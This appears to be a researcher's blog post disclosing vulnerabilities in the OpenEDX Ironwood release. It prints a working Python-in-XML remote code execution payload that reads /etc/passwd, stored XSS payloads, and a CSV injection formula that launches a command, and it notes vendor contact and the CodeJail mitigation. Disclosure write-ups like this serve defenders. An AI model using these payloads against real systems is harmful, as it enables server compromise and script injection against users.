---
layout: post
title: How I found a Remote Code Execution in OpenEDX
---

**How I found a Remote Code Execution in OpenEDX**

![alt text](https://media-exp1.licdn.com/dms/image/C4D0BAQEImBWi8mCV9w/company-logo_200_200/0?e=1597881600&v=beta&t=3TJtPgE49E8s9Ox3X3h15mgb4Ls8vjX9_VL5DX9HkqY "Logo Title Text 1")

OpenEDX platform is really cool Learning Management System, which is also Open source (this time I was testing the Ironwood release 2.5). You can check it out here: <https://open.edx.org/the-platform/> When I was using it, I decided to check for their security. So I followed my normal approach: first mapping the app, writing down which functionalities it had, blackbox testing, and then whitebox.

As you can see here: <https://github.com/edx/edx-platform> the whole platform is written in Python (in which I don’t have many experience reviewing code). So I decided to go completely blackbox this time. As I really needed to know all the functionalities in depth, I went to the official documentation:

**https://edx.readthedocs.io/projects/open-edx-building-and-running-a-course/en/latest/index.html**

![alt text](https://pic.accessify.com/thumbnails/777x423/d/docs.edx.org.png "test")

So after some time digging in the docs I found this:
![ssdsd](https://i.imgur.com/HUdrMOi.png)

So it turns out that if you create an account in the OpenEDX platform instance and go to the Studio, create a Course, Create a Unit in the course and add a Problem. And if you choose Custom Python-Evaluated problem and use a payload such as:
~~~~
<problem>

<script type="python">
def test_add(expect,ans):
    os.system("cat /etc/passwd > /tmp/test_rce")
    
</script>

<p>Problem text</p>
<customresponse cfn="test_add" expect="20">
        <textline size="10" correct_answer="11" label="Integer #1"/><br/>
        <textline size="10" correct_answer="9" label="Integer #2"/>
</customresponse>

    <solution>
        <div class="detailed-solution">
          <p>Solution or Explanation Heading</p>
          <p>Solution or explanation text</p>
        </div>
    </solution>
</problem>
~~~~

And click the Submit button, you can execute code in the machine.


![alt text](https://s6.gifyu.com/images/openedx-rce.gif "whatever")

So when I discovered this, I contacted EDX’s security team and they told me that there is a mitigation for this kind of issues, but it is not enabled by default:

**https://github.com/edx/codejail**

Apart from this vulnerability I also found a stored XSS. In EDX STUDIO&gt;CONTENT&gt; FILE UPLOADS&gt; Upload an SVG XSS file. And also 2 more XSS:

1) EDX STUDIO&gt;COURSENAME&gt;CONTENT&gt; UPDATES &gt; Press the edit button and replace the default thing with &lt;img src=x onerror=alert(0)&gt;

2) Finally in EDX STUDIO&gt;COURSENAME&gt;SETTINGS&gt;

Finally I found a CSV injection as well:

Course &gt;Instructor&gt;Cohorts&gt;Add cohort with the payload (ex: =cmd|' /C notepad'!'A1')&gt;Add your user to the cohort
Course&gt;Data Downloads&gt;Reports&gt;Download profile info as CSV&gt;The file is generated below, open in Excel 2016, Data&gt;Import data from file&gt;Choose CSV&gt;Using comma as delimiter.

So, that was all for today. Please make sure you enable CodeJail while using OpenEDX platform. Thanks for reading the post ;)
